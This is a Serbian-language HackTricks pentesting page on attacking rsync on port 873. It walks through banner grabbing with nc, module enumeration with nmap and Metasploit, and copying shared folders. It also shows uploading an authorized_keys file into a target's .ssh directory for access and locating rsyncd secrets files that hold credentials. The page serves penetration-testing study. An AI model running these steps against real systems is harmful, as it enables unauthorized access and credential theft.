# 873 - Pentesting Rsync

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite da vidite **vašu kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** Proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

## **Osnovne informacije**

Sa [wikipedia](https://en.wikipedia.org/wiki/Rsync):

> **rsync** je alatka za efikasno [transferisanje](https://en.wikipedia.org/wiki/File\_transfer) i [sinhronizaciju](https://en.wikipedia.org/wiki/File\_synchronization) [fajlova](https://en.wikipedia.org/wiki/Computer\_file) između računara i eksternog hard diska i između računara u mreži tako što upoređuje vreme modifikacije i veličine fajlova.[\[3\]](https://en.wikipedia.org/wiki/Rsync#cite\_note-man\_page-3) Često se koristi na [Unix-sličnim](https://en.wikipedia.org/wiki/Unix-like) [operativnim sistemima](https://en.wikipedia.org/wiki/Operating\_system). Rsync algoritam je vrsta [delta enkodiranja](https://en.wikipedia.org/wiki/Delta\_encoding) i koristi se za minimiziranje korišćenja mreže. [Zlib](https://en.wikipedia.org/wiki/Zlib) se može koristiti za dodatno [kompresovanje podataka](https://en.wikipedia.org/wiki/Data\_compression),[\[3\]](https://en.wikipedia.org/wiki/Rsync#cite\_note-man\_page-3) a [SSH](https://en.wikipedia.org/wiki/Secure\_Shell) ili [stunnel](https://en.wikipedia.org/wiki/Stunnel) se mogu koristiti za bezbednost.

**Podrazumevani port:** 873

```
PORT    STATE SERVICE REASON
873/tcp open  rsync   syn-ack
```

### Prebrojavanje

### Baner i ručna komunikacija

```bash
nc -vn 127.0.0.1 873
(UNKNOWN) [127.0.0.1] 873 (rsync) open
@RSYNCD: 31.0        <--- You receive this banner with the version from the server
@RSYNCD: 31.0        <--- Then you send the same info
#list                <--- Then you ask the sever to list
raidroot             <--- The server starts enumerating
USBCopy
NAS_Public
_NAS_Recycle_TOSRAID	<--- Enumeration finished
@RSYNCD: EXIT         <--- Sever closes the connection


#Now lets try to enumerate "raidroot"
nc -vn 127.0.0.1 873
(UNKNOWN) [127.0.0.1] 873 (rsync) open
@RSYNCD: 31.0
@RSYNCD: 31.0
raidroot
@RSYNCD: AUTHREQD 7H6CqsHCPG06kRiFkKwD8g    <--- This means you need the password
```

### **Nabrajanje deljenih fascikli**

**Rsync moduli** se prepoznaju kao **deljeni direktorijumi** koji mogu biti **zaštićeni lozinkama**. Da biste identifikovali dostupne module i proverili da li zahtevaju lozinke, koriste se sledeće komande:

```bash
nmap -sV --script "rsync-list-modules" -p <PORT> <IP>
msf> use auxiliary/scanner/rsync/modules_list

# Example with IPv6 and alternate port
rsync -av --list-only rsync://[dead:beef::250:56ff:feb9:e90a]:8730
```

Budite svesni da neki deljeni resursi možda neće biti prikazani na listi, što ih može sakriti. Takođe, pristup nekim deljenim resursima može biti ograničen na određene **poverljive podatke**, što se može videti kroz poruku **"Pristup odbijen"**.

### [**Brute Force**](../generic-methodologies-and-resources/brute-force.md#rsync)

### Ručna upotreba Rsync-a

Nakon dobijanja liste **modula**, akcije zavise od toga da li je potrebna autentifikacija. Bez autentifikacije, **prikazivanje** i **kopiranje** fajlova sa deljenog foldera na lokalni direktorijum se postiže kroz:

```bash
# Listing a shared folder
rsync -av --list-only rsync://192.168.0.123/shared_name

# Copying files from a shared folder
rsync -av rsync://192.168.0.123:8730/shared_name ./rsyn_shared
```

Ovaj proces **rekurzivno prenosi fajlove**, čuvajući njihove atribute i dozvole.

Sa **poverljivim podacima**, listanje i preuzimanje fajlova iz deljene fascikle se može obaviti na sledeći način, gde će se pojaviti zahtev za unos lozinke:

```bash
rsync -av --list-only rsync://username@192.168.0.123/shared_name
rsync -av rsync://username@192.168.0.123:8730/shared_name ./rsyn_shared
```

Da biste **prebacili sadržaj**, kao što je datoteka _**authorized\_keys**_ za pristup, koristite:

```bash
rsync -av home_user/.ssh/ rsync://username@192.168.0.123/home_user/.ssh
```

## POST

Da biste pronašli konfiguracionu datoteku rsyncd, izvršite:

```bash
find /etc \( -name rsyncd.conf -o -name rsyncd.secrets \)
```

Unutar ovog fajla, parametar _secrets file_ može ukazivati na fajl koji sadrži **korisnička imena i lozinke** za rsyncd autentifikaciju.

## Reference

* [https://www.smeegesec.com/2016/12/pentesting-rsync.html](https://www.smeegesec.com/2016/12/pentesting-rsync.html)

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite da vidite **vašu kompaniju reklamiranu u HackTricks-u** ili **preuzmete HackTricks u PDF formatu** Proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
